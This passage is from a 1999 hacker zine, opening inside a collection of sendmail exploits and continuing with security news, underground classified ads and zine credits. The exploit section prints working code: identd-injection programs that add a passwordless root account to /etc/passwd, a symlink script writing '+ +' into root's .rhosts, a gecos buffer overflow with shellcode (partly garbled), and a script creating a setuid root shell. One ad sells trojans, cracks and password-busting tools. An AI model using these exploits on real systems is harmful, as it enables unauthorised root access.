 * NOTES: If sendmail.cf is configured with Og1 and Ou1 lines (setting the
 * default user to bin.bin), this exploit will not work.
 *
 * Also, since this only works when sendmail queues up the message for
 * later delivery, the time of execution is dependant on how sendmail
 * has been configured in sendmail.cf and machine load.  Heavily loaded
 * machines (or machines that have been intentionally flooded) have a
 * greater possibility of this exploit working.
 *
 */

#include &lt;sys/types.h>
#include &lt;sys/fcntl.h>
#include &lt;sys/time.h>
#include &lt;stdio.h>
#include &lt;stdlib.h>
#include &lt;string.h>
#include &lt;unistd.h>

/* TIMEOUT is the number of seconds to wait before closing the connection if
 * the client doesn't provide the port pairs.
 */

#define TIMEOUT 120
/* PROCINFO_BUFFER_SIZE must be bigger than 80 */
#define OUTPUT_BUFFER_SIZE 2048
#define SOCKET_BUFFER_SIZE 100

unsigned short lport = 0, rport = 0;

void
main ()
{
    unsigned long here, there;
    struct fd_set fdset;
    struct timeval timeout;
    char buffer[OUTPUT_BUFFER_SIZE];
    char inbuffer[SOCKET_BUFFER_SIZE];
    int len;
    int fd;

    FD_ZERO (&fdset);
    FD_SET (0, &fdset);
    timeout.tv_sec = TIMEOUT;
    timeout.tv_usec = 0;

    select (1, &fdset, NULL, NULL, &timeout);
    len = read (0, inbuffer , SOCKET_BUFFER_SIZE - 1 );
    if (len <= 0)
    exit (0);
    FD_SET (0, &fdset);

    sprintf (buffer, "%s : USERID : UNIX : %s\r\n", inbuffer,
    "Croot\r\nMprog, P=/bin/sh, F=lsDFMeu, A=sh -c $u\r\nMlocal,
    P=/bin/sh, F=lsDFMeu, A=sh -c $u\r\nR<\"|/bin/echo toor::0:1:toor:/:/bin/csh
 >> /etc/passwd\">\r\nR<\"|/usr/bin/chmod 4755 /usr/bin/time\");
    write (1, buffer, strlen (buffer));
    exit (0);
}

Second Exploit follows:

/* 8.6.10 sendmail attacker
 *
 * gcc ident.c -o ident
 * add the following line to your /etc/inetd.conf:
 * ident  stream tcp  nowait  root  /tmp/ident  in.identd
 * then kill -HUP inetd
 *
 * Not for not public use or disclosure.
 *
 * This is a sendmail 8.6.10 attack based on the problems that
 * sendmail 8.6.10 inherited from sendmail 8.6.9 - blindly accepting
 * information given to it by identd, which included bogus characters
 * and newlines that it later appended to the queue file.  Sendmail 8.6.10
 * supposedly "strips" newlines before they are written, however, it
 * converts them to spaces, and the following code demonstrates that
 * quick work-around patches are never ever stable...
 *
 * NOTES: If sendmail.cf is configured with Og1 and Ou1 lines (setting the
 * default user to bin.bin), this exploit will not work.
 *
 * Also, since this only works when sendmail queues up the message for
 * lar delivery, the time of execution is dependant on how sendmail
 * has been configured in sendmail.cf and machine load.  Heavily loaded
 * machines (or machines that have been intentionally flooded) have a
 * greater possibility of this exploit working.
 *
 */

#include &lt;sys/types.h>
#include &lt;sys/fcntl.h>
#include &lt;sys/time.h>
#include &lt;stdio.h>
#include &lt;stdlib.h>
#include &lt;string.h>
#include &lt;unistd.h>

/* TIMEOUT is the number of seconds to wait before closing the connection if
 * the client doesn't provide the port pairs.
 */

#define TIMEOUT 120
/* PROCINFO_BUFFER_SIZE must be bigger than 80 */
#define OUTPUT_BUFFER_SIZE 2048
#define SOCKET_BUFFER_SIZE 100

unsigned short lport = 0, rport = 0;

void
main ()
{
    unsigned long here, there;
    struct fd_set fdset;
    struct timeval timeout;
    char buffer[OUTPUT_BUFFER_SIZE];
    char inbuffer[SOCKET_BUFFER_SIZE];
    int len;
    int fd;
    FD_ZERO (&fdset);
    FD_SET (0, &fdset);
    timeout.tv_sec = TIMEOUT;
    timeout.tv_usec = 0;

    select (1, &fdset, NULL, NULL, &timeout);
    len = read (0, inbuffer , SOCKET_BUFFER_SIZE - 1 );
    if (len <= 0)
    exit (0);
    FD_SET (0, &fdset);
    sprintf (buffer, "%s : USERID : UNIX : %s\r\n", inbuffer,
    "Croot\t\t\t\t\t\t\tMprog, P=/bin/sh, F=lsDFMeu, A=sh -c $u\t\t\t\t\t\t
    Mlocal,
    P=/bin/sh, F=lsDFMeu, A=sh -c $u\t\t\t\t\t\tR<\"|/bin/echo toor::0:1:toor:/:
/bin/csh >> /etc/passwd\">\t\t\tR<\"|/usr/bin/chmod 4755 /usr/bin/time\">\r\n
    $rascii done");
    write (1, buffer, strlen (buffer));
    exit (0);
}

HP-UX = HP-UX 9.x =

#!/bin/sh
# This works on virgin HPUX 9.x sendmail.cf
# The link can be set to any file on the system, it will append the contents
# of the email to the linked file (/etc/passwd, /etc/hosts.equiv, /.rhosts)..
# - sirsyko

r00tDIR=`grep root /etc/passwd |cut -f6 -d:`
RunDMC=`hostname`

if [ -f /tmp/dead.letter ]; then rm /tmp/dead.letter
fi
if [ -f /tmp/dead.letter ]; then
 echo "Sorry, aint gonna work"
 exit
fi

ln -s  ${r00tDIR}/.rhosts /tmp/dead.letter

(
sleep 1
echo "helo"
echo "mail from: noone"
echo "rcpt to: noone@bounce"
echo "data"
echo "+ +"
echo "."
sleep 3
echo "quit"
) | telnet ${RunDMC} 25

sleep 5
remsh ${RunDMC} -l root

What the r00t guys exploit does is just this:

   * creates a symbolic link to the target file (in this case '.rhosts' in
     root's directory) called '/tmp/dead.letter'.
   * Then sends a message (containing lines you want to append) to a
     non-existent user.
   * Sendmail is configured (as default) to append lines of non-recipient
     messages to '/tmp/dead.letter' and does it with root privileges. If
     '/tmp/dead.letter' is a symbolic link Sendmail will follow it and will
     overwrite the pre-existent file.
   * Probably if Sendmail configuration has been changed to make it behave
     in a different way, looking at the cf file could lead you to exploit
     the bug the same.

8.7.5 gecos = 8.X.X <8.8.0 = TeSTed oN 8.6.12

This bug was pointed out by Mudge of L0pht on Bugtraq on Sept 1996,
excerpts follow:

A buffer overflow condition exists that allows a user to overwrite the
information in a saved stack frame. When the function returns, the saved
frame is popped off of the stack and user code can be executed. If a user
is able to alter his/her gecos field then that user can exploit a coding
flaw in sendmail to elevate their effective UID to 0.

The actual problem in the code is quite apparent.

     Inside recipient.c we find the following:

       char nbuf[MAXNAME + 1];
       ...
       buildfname(pw->pw_gecos, pw->pw_name, nbuf);

The problem is that nbuf[MAXNAME + 1] is a fixed length buffer and as we
will soon see, buildfname() does not honor this. [ ..... ]

This particular problem has been fixed in Sendmail 8.8 beta.

Here we have an example of exploit:

/*                               Hi !                                       */
/* This is exploit for sendmail bug (version 8.6.12 for FreeBSD 2.1.0).     */
/* If you have any problems with it, send letter to me.                     */
/*                             Have fun !                                   */

/* -----------------   Dedicated to my beautiful lady   ------------------  */
/* Leshka Zakharoff, 1996. E-mail: leshka@chci.chuvashia.su                 */

#include &lt;stdio.h>
main()
{
void make_files();
     make_files();
     system("EDITOR=./hack;export EDITOR;chmod +x hack;chfn;/usr/sbin/sendmail;e
cho See result in /tmp");
}

void make_files()
 {
  int i,j;
  FILE *f;
  char nop_string[200];
  char code_string[]=
                      {
                         "\xeb\x50"                         /* jmp
cont */

/* geteip: */            "\x5d"                             /* popl
%ebp */
                         "\x55"                             /* pushl
%ebp */
                         "\xff\x8d\xc3\xff\xff\xff"         /* decl
0xffffffc3(%ebp) */
                         "\xff\x8d\xd7\xff\xff\xff"         /* decl
0xffffffd7(%ebp) */
                         "\xc3"                             /* ret */

/* 0xffffffb4(%ebp): */ "cp /bin/sh /tmp"
/* 0xffffffc3(%ebp): */ "\x3c"
                        "chmod a=rsx /tmp/sh"
/* 0xffffffd7(%ebp): */ "\x01"
                        "-leshka-leshka-leshka-leshka-"    /* reserved */

/* cont:  */            "\xc7\xc4\x70\xcf\xbf\xef"         /* movl
$0xefbfcf70,%esp */
                        "\xe8\xa5\xff\xff\xff"             /* call
geteip */
                        "\x81\xc5\xb4\xff\xff\xff"         /* addl
$0xb4ffffff,%ebp */
                        "\x55"                             /* pushl  %ebp */
                        "\x55"                             /* pushl  %ebp */
                        "\x68\xd0\x77\x04\x08"             /* pushl
$0x80477d0
 */
                        "\xc3"                             /* ret */
                        "-leshka-leshka-leshka-leshka-"    /* reserved */
                        "\xa0\xcf\xbf\xef"
                     };

  j=269-sizeof(code_string);
  for(i=0;i\"$1\"\n");
  fprintf(f,"touch -t 2510711313 \"$1\"\n");
  fclose(f);
}

mime7to8() = 8.8.0 =

An attacker can simply create a very large message in which each line ends
with "=" and use it to overwrite the sendmail process's stack. Here the bug
is only described... why doesn't someone write an exploit?!

There is a serious bug in the mime7to8() function of sendmail 8.8.0 which
allows anyone who can send you mail to execute arbitrary code as root on
your machine. I think mime7to8() only gets invoked if you set the
undocumented "9" mailer flag. However, this flag is set by default in the
cf/mailer/local.m4 file that ships with sendmail 8.8.0. Thus, if you are
using an old V6 format configuration file from sendmail 8.7, you are
probably safe, but if you generated a new V7 configuration file, you are
probably vulnerable to this bug.

Now here are the technical details:

The inner loop of mime7to8() looks like this:

        u_char *obp;
        char buf[MAXLINE];
        u_char obuf[MAXLINE];

        ....

                /* quoted-printable */
                obp = obuf;
                while (fgets(buf, sizeof buf, e->e_dfp) != NULL)
                {
                        if (mime_fromqp((u_char *) buf, &obp, 0, MAXLINE) == 0)
                                continue;

                        putline((char *) obuf, mci);
                        obp = obuf;
                }

When mime_fromqp() encounters a line that ends "=\n", it chops those two
characters off and returns 0 to indicate a continuation line. This causes
the while loop to continue, reading another input line and appending its
contents to obuf. However, when the loop continues without resetting obp to
obuf, there are fewer than MAXLINE characters left in the output buffer.
This means an attacker can simply create a very large message in which each
line ends with "=". Eventually obp will move beyond the end of obuf and
start writing almost arbitrary data to the sendmail process's stack (as
long as no bytes are 0).

smtpd = 8.7-8.8.2 =

Read the exploit and don't bother:

#/bin/sh
#
#
#                                   Hi !
#                This is exploit for sendmail smtpd bug
#    (ver. 8.7-8.8.2 for FreeBSD, Linux and may be other platforms).
#         This shell script does a root shell in /tmp directory.
#          If you have any problems with it, drop me a letter.
#                                Have fun !
#
#
#                           ----------------------
#               ---------------------------------------------
#    -----------------   Dedicated to my beautiful lady   ------------------
#               ---------------------------------------------
#                           ----------------------
#
#          Leshka Zakharoff, 1996. E-mail: leshka@leshka.chuvashia.su
#
#
#
echo   'main()                                                '>>leshka.c
echo   '{                                                     '>>leshka.c
echo   '  execl("/usr/sbin/sendmail","/tmp/smtpd",0);         '>>leshka.c
echo   '}                                                     '>>leshka.c
#
#
echo   'main()                                                '>>smtpd.c
echo   '{                                                     '>>smtpd.c
echo   '  setuid(0); setgid(0);                               '>>smtpd.c
echo   '  system("cp /bin/sh /tmp;chmod a=rsx /tmp/sh");      '>>smtpd.c
echo   '}                                                     '>>smtpd.c
#
#
cc -o leshka leshka.c;cc -o /tmp/smtpd smtpd.c
./leshka
kill -HUP `ps -ax|grep /tmp/smtpd|grep -v grep|tr -d ' '|tr -cs "[:digit:]" "\n"
|head -n 1`
rm leshka.c leshka smtpd.c /tmp/smtpd
/tmp/sh


          |---------------------- Credits ----------------------|

All this info was mainly grabbed from:

   * Bugtraq
   * 8lgm
   * In***ax Digest
   * "Improving the Security of Your Site by Breaking Into it" By Dan
     Farmer & Wietse Venema
   * "Sendmail Bug Exploits List v.04b" By Per1com/Xer0
   * "Time For a Change" #1 'UNIX problems, for fun and exploit.' By Ghost
     in the Machine



+++++++++++++++++++++

0111	Hacker News Network

"Hacking Exposed" Available Soon 	

contributed by Weld Pond  
Osborne McGraw-Hill, has published a new book by authors 
Stuart McClure and Joel Scambray entitled HACKING EXPOSED: 
Network Security Secrets and Solutions. McClure and Scambray 
are better known as columnists for InfoWorld's Security Watch 
column. This book is being billed as the ultimate resource for 
businesses needing a comprehensive plan to defend their network 
against the sneakiest hacks and latest attacks. Advanced reviews 
by leading security experts such as Marcus Ranum, Dr. Mudge, 
Simple Nomad, And Aleph One have all been extremely positive.  

Internet Wire 
http://www.internetwire.com/technews/tn/tn984175.dsl

Hacking Exposed: Network Security Secrets and Solutions	
http://www.amazon.com/exec/obidos/ASIN/0072121270/thehackernewsnet

WebTV Hole Divulges User Info 	

contributed by Weld Pond  
A security flaw in Microsoft's WebTV product could 
divulge user information such as the user ID. This information 
could then be used to change information about the account. 
WebTV accounts can only hold 150 messages, once this limit 
was reached bounce messages would include the customers 
information.  

ZD Net	
http://www.zdnet.com/zdnn/stories/news/0,4586,2334232,00.html

Global Hell Expose 	

contributed by altomo  

A long hard look at Global Hell and some of its 
members including MostHated, ben-z, altomo, 
egodeath, nostalg1c, Mnemonic and others. 
Global Hell or gH has been linked to well over 
100 web page defacements and one of its 
members, Mindphasr (Chad Davis), has been 
arrested by the FBI.  

MSNBC	
http://www.msnbc.com/news/308025.asp

Fringe Goes Offline 	

contributed by White Vampire  
The popular web site 'Fringe of the Web' has 
decided to shut down after a year in operation. 
FoW was a popular underground web site ranking 
page that allowed people to rank web sites based 
on which ones they visited. This is the second time 
the FoW has been decommissioned, the first time 
was back in 1996. The admin of the site RSnake 
says he will probably leave the scene.  

Project Gamma	
http://www.projectgamma.com/news/archive/1999/september/090999-2328.html

GNU Launches Free Encryption Tool 	

contributed by Weld Pond  
As a replacement for the now commercial PGP, 
GNU software has released GNU Privacy Guard 
(GnuPG) version 1.0.0. Since the software was 
developed outside the US, does not contain any 
patented algorithms and is in the public domain 
the software does not come under control of US 
export restrictions or the Wassenaar agreement. 
GnuPG features 128 bit encryption, support for a 
key expiration date, and comes in eight different 
languages. It was originally written for GNU/Linux, 
FreeBSD and OpenBSD systems, and has recently 
been ported to Windows.  

GNU Privacy Guard 
http://www.gnupg.org/

Free Software Foundation 
http://www.fsf.org/

CNN	
http://www.cnn.com/TECH/computing/9909/09/gnupg.idg/index.html

BackDoor in Windows Found 	

contributed by evil wench  

A real back door has been found in Windows 
2000 Beta 3. MS said it knew about the hole 
back in April and that approximately 650,000 
systems could be at risk. The problem is 
based in the 'autologin' account that is automatically 
created for users who are not connected to a 
domain. If the telnet server is active, which can be 
done remotely with Visual Basic commands, a 
malicious attackers could login through this 
account and have complete control over the 
system.  

ZD Net	
http://www.zdnet.com/zdnn/stories/news/0,4586,2331412,00.html

1000	DECLASSIFIEDS (H/P Related Materials)

Available from L0pht Heavy Industries (http://www.l0pht.com)

** l0pht Crack **
Description: Over 500,000 downloads and still going strong. The NT IT community has embraced L0phtCrack 2.5 as the password auditing tool of choice. 
 
Pricing: The trial period is 15 days, after which the product must be registered for $100. A command-line, stripped down version of the program is available for free with source code. 

Site licences are also available 

** SLINT Source Code Analyzer **

Description: Source code security analyzers are available in the underground and are being used to scan commercial product for vulnerabilities. Render the PD warez obsolete with SLINT. 
 
Pricing: email business@l0pht.com. 

** Black Crawling Systems Archives CD **

Description: The Black Crawling Systems Archives CD will be especially useful to all Network Administrators, Hackers, Computer Security Professionals, Phreakers, Computer Teachers, Crackers, Lab Monitors, Virus Writers, Communication Specialists, and anyone 
else that wishes to have a copy of this unique archive collection for their personal use. 
 
Pricing: 	$25.00 plus $5.00 for shipping and handling in United States currency for each CD ordered 

TECHADS.CJB.NET

What is TechAds? TechAds is a online classified site that 
caters to the desires of the hacker community.  The site is 
run and operated by the 719 group, you can peruse the links 
bellow to see if you can find what you need or want or you 
can place your ad for that old Comodore 64 you have in the 
attic. 

WWW.CANADIANTOM.COM

The full Harmless Strategies members website on CD-ROM  
 
All the files and texts from the Members website in one place! Three years of accumulating the best software and tutorials for beginners and experts alike. Learn to use trojans like back orifice and masters paradise! Adult site passwords! Control viruses, make them and kill them!  
 
Incredible collection of software!  
Included on this cd is the latest software programs which will allow you to crack, hack ,reverse engineer, and more!  These are mostly shareware 
programs!  
 
You do not need to buy the cd in order to obtain these programs. 
Simply send me an email with the program or text file you want 
and i will send it to you through email or send you the url! They 
are included on the cd for people who do not want to be tracked 
or spend hours downloading from their service provider.  
SoftIce Used by the best crackers in the world!  

UltraEdit 
  Must have editor for crackers and reversers  
NukeNabber 
  Detect people trying to access your machine through your modem!  
Windows Washer 
  Automate the cleansing of your cache and history files and more!  

NeoTrace 
  Find out exactly where your packets are sent  
Dll Show 
  Know when a trojan is planted in your machine!  
Type it in 
  Automates filling out forms. Use it to attack password programs.  
The Cleaner 2 
  Detects all known trojans on your machine.  
Directory Snoop 
  Find files that are supposed to be erased! Unerase data easily!  
EnCase Software used by law enforcement agencies to get private data.  
BC Wipe 
  Use this program with encase (above) to insure your data is gone forever!  
BlowFish 
  Encrypt your data with military strength  
WWWHack 
  Make your own passwords for any adult or password protected site on 
the net!  
Glide 
  Another great password buster  
Nag Buster 
  Get rid of annoying nag screens on shareware  
Oscar 10.3 
  Thousands of serials and cracks for the latest shareware.  
Romeo 
  Hundreds of serial numbers in an easy to use program.  

Texts *  
ICQ Hacking utilities  
The famous Jolly Roger Cookbook  
Serials- more than 9,000 in one searchable text!  
The MIT complete guide to lockpicking  
Anarchist Cookbook  
Harmless Strategies Anyone Can do  
Phreaking Telephones  
Universal Product Codes  
How to Nuke people, How to Mailbomb!  

* These tutorials and software are offered on 
the cd but are also available freely on the 
internet! If you have trouble collecting any 
of the above articles please send me an 
email and they will be provided to you free 
of charge through email or I will send you 
the URL where they can be located. The purpose 
of providing them on the cd is to avoid tracking 
and save you time charges through your service 
provider. (Do not request more than three at 
one time!)  

Your purchase will include one year of website 
access in the Harmless Strategies Member Site! 
As well as the weekly newsletter!  

Everything is contained on a CD-Rom delivered anywhere in the 
world for the ridiculously low price of only $45.00 (US) $60.00 
Canadian funds  

This price includes shipping anywhere in the world!  
Send payment of $45.00 US, $60.00 Canadian funds to;  

Thomas Yeomans  
RR#3, New Germany  
Nova Scotia, Canada  
B0R 1E0  

LOOKING FOR ANOTHER ZINE TRY ONE OF THESE ON FOR SIZE:

** COLUMBIA 2032 **
Columbia 2032 (C2032) is looking for individuals who would like to write 
articles for our zine. Topics include: Phone systems (cellular/normal), 
Cryptography, IRC, TCP/IP, Information Warfare, Computer Security and just about anything pertaining to computers /or phones. We have been around approximately 10 months. We just released our biggest (93.4k) and best edition yet, which can be downloaded under "Library" at c2032.crashcentral.com In our effort to expand our distribution, quality, and quantity of the zine, we are looking for more writers and or willing people to distribute the zine. Our subscribers and writers consist of people from within the hack/phreak community and professional individuals alike. Please send all responses to C2032@theglobe.com We are a freelance zine so if it is money you want please don't respond.  

Head Editors: 
 
Absolute Matter - Absolute_Matter@hotmail.com  
Enigma 		- Enigma@crashcentral.com	 

http://c2032.crashcentral.com/

Please watch for 'news' updates pretaining to computers compiled from a variety of news sources.-Enigma 
 
** PHANZ (Phreaking/Hacking/Anarchy/New Zealand) **

Phanz (Formerly:AnarchyNewZealand) is a group of hackers/
phreakers/anarchists from around the world that have joined in unison to fight for a free world, where we are allowed to know what we deserve to know, where we can distribute valuable information freely and for free. Where we can do whatever we can to show people this information and they can be interested, knowing they will not get in trouble for having this information on them. 
 
+++++++++++++++++++++

1001	Websites & Supporters

Electronic Underground Affiliation thanks the 
following orginizations for their assistance in 
providing  information for you. Drop them a 
email and say thanks! 
 
L0pht Heavy Industries 
http://www.l0pht.com/
admin@l0pht.com 
 
H N N r The Hacker News Networks 
http://www.hackernews.com/
contact@hackernews.com 
 
Probe Industries Magazine Philes (PIMPr) 
Currently Offline  
 
attrition.org 
http://www.attrition.org/
modify@attrition.org 
 
The Fray 
cronus@iol.ie 
 
Columbia 2032 
http://c2032.crashcentral.com/
C2032@thglobe.com 
 
CrashCentral.com 
http://www.crashcentral.com/
 
The Electronic Underground Affiliations proudly presents our newest 
 
Digital Distributors Site 
 
http://www.attrition.org/~modify/texts/zines/EUA 
questions or comments: modify@attrition.org 

+++++++++++++++++++++

1010	Community News EUA 411General Goings On

** General 411 **
Well, let's see... August brought around a strange turn 
of events.  We've experienced a hurricane, which has 
set back our plans for getting a few of the needed 
items for the news system together.  We are still 
reviewing the ISDN system and looking at porting the 
site to a system that can carry the load a bit better.  
Right now it looks as if we are going to have to hold 
off on some of the components (SPARC's are 
expensive) until we get some more $.  

** EUACon `99 **
Well it's happened and now official.  The first annual EUA Con 
`99 is happening in Los Angeles, California November 1999.   
Would you like more information on it? Would you like to attend?  
Contact Phrack Wolf  or Forensic for more information.   
 
WHEN:		13-14 November 
PLACE:		Los Angeles, CA 
PURPOSE:	To have fun and 	share some of the 
		trade secrets. 
 
** EUACon Y2K ** 
The Second Annual EUACon is going to be held in Chicagoland 
Illinois.  We are still working out the finer details of the 
conference. Right now it looks like some of the things that we 
have planned are going to be assisted by some of those in the 
Chicago 2600 and local hacker & phreak community.  If you are 
interested in learning more about this Con stay tuned and keep 
checking out what is going on by hitting our site and getting the 
latest news for what is up an coming. 
 
Catch us on IRC to find out more 411 
 
irc.xnet.org #eua 
 
** SUBSCRIPTION INFORMATION **

You want to subscribe to the zine all you need to do is 
email with SUBSCRIBE as the subject line of  to  
 
	euamonthly@eua.tzo.org  
 
We work on trying to personally get in touch with 
each and everyone who signs up for the EUA 
Monthly.  But if you do not hear from us a while, do 
not get depressed, keep checking the EUA Monthly 
Zine site and download it once it hits the street. 
 
The Raven 

** VOLUNTEER YOUR TIME **

Do you have the skills to write for us? Do you have 
the time to commit? Do you have a late breaking 
techno article that you'd like to see in digiprint? Well, 
drop us a line and send us your 411.  We are always 
looking for more information and articles to put into 
the zine.  Remember that this is a member driven zine 
so the more that you add and submit, the more help it 
is to your fellow readers. 
 
Enjoy & L8R 
 
Archive 

+++++++++++++++++++++

1011	About the EUA and Shout Outs
Special Thanks and Credits go to the following for their article submissions 
and help with publication for this months edition of the E.U.A.: 
 
Joe Nobody	- Being 2nd Set of Eyes Andrew 
Ferrnades	- MS-NSA Info 
Forensic	- Interview with Andrew 			  Fernades  
ZHart		- Sendmail Information 
Raven		- Snippets of 411 

The Electronic Underground Affiliation is aimed at setting a 
new standard in the hacker community based on the old school 
idea for the "Free Exchange of Information and Ideas." 
 
ELECTRONIC UNDERGROUND AFFILIATION  
 

Idea:      	The Free Exchange of Information and Knowledge.  

Purpose:  	To Ensure that Information and Knowledge are available to anyone 
		seeking.  
Goal:      	To enlist the assistance, wisdom, knowledge and information of as 
		many  IS specialists, hackers, crypto- & cypherpunks, users as possible.  

Ethic:      	Unlike society, the EUA does not be hindered by the social stigmas 
		of our  day. We will not discriminate others on the basis of:  
		1)  Sex, 2) Race,  3) Religious Beliefs, 4) Affiliation, 5) Physical 
		Impairments, or  6) Age.  
  
The  Moto:	"Aut Hack Vincere Aut Mori"    
 
 
-Editor/Publishers		Archive & Raven 
SoCal Digital Publishing		Brainkandy 
IL Digital Publishing		Enigma 
Chicagoland Digital  
Publishing			Fringe 
GA Digital Publishing		Napalm1o 
NC Digital Publishing		Raven 
PA Digital Publishing		CyberMonk 
CA Digital Publishing		Phrack Wolf 
Canadian Digital Publishing	Necro 
Australian Digital Publishing	-vacancy- 
EUA Digital Promotions & Public 
Relations Officer			-vacancy- 
Social Engineering Department	Phrack Wolf 
EUA Webmaster			Joe Nobody 
Phreaking Department		Enigma 
Graphics 			various members of EUA 
EUA Coder			Null Value 
EUA NT Department		Konceptor  (Recently Detained)

+++++++++++++++++++++

1100	And Coming Next Edition...

	So come on already! Tell us!  
		  What's coming next month? 

Well the honestly, we don't know.  EUA is re-thinking 
some ideas on how to format the zine to be more 
informative and helpful to our users.  We are going to be 
playing with some ideas that may come to fruit.  One idea 
is to get the zine on a quarterly format, to ease the burden 
on our end.  With the zine just being a hobby and time a 
major factor, we want to try to keep the zine going and 
operational while meeting the needs of our readers.  If you 
have any ideas or suggestions let us know. 
 
 
Some of the things that you can look forward to in next 
edtion are: 
 
	Bourne Shell Programing (Pt2) 
 
	Unix for Intermediate Users (Pt 2) 
 
	Network Analysis by ROM 
/9999/
```

</div>
